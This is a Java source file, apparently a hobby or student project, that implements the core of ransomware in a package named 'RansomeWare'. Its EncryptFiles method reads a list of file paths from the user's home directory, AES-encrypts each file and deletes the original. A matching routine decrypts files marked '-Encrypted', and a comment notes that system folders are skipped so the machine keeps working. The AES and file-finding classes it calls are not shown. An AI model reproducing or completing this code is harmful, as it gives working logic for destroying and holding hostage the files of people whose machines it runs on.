package RansomeWare;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;

public class JavaWare {

    AES aes;

    public JavaWare() {
        aes = new AES();
    }

    public void EncryptFiles() throws Exception{
        FindFiles ff = new FindFiles();
        long startTime = System.nanoTime();
        ff.FindFiles();
        long endTime = System.nanoTime();

        System.out.println("Time: " + (endTime - startTime));
        System.out.println(ff.count);



        BufferedReader reader = new BufferedReader(new FileReader(System.getProperty("user.home") + File.separator + "output.txt"));
        String line = reader.readLine();
        while(line != null) {
            //System.out.println(line);
            File file = new File(line);
            aes.encrypt(file);
            file.delete();
            //read next line
            line = reader.readLine();
        }
        reader.close();
    }

    public void DecryptFiles() throws Exception {
        String home = System.getProperty("user.home") + File.separator + "Desktop" + File.separator + "Documents";
        decryptionTraversal(home);
    }

    public void decryptionTraversal(String path) throws Exception {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;

        for(File f: list) {
            if(f.isDirectory()) {
                if (f.getName().equals("Windows") || f.getName().equals("Library")) return; //system still works
                decryptionTraversal(f.getAbsolutePath());
            } else {
                String filename = f.getName();
                if(filename.contains("-Encrypted")) {
                    aes.decrypt(f);
                    f.delete();
                }
            }
        }
    }



    public static void main(String[] args) throws Exception {
        JavaWare jw = new JavaWare();
        jw.DecryptFiles();

    }
}
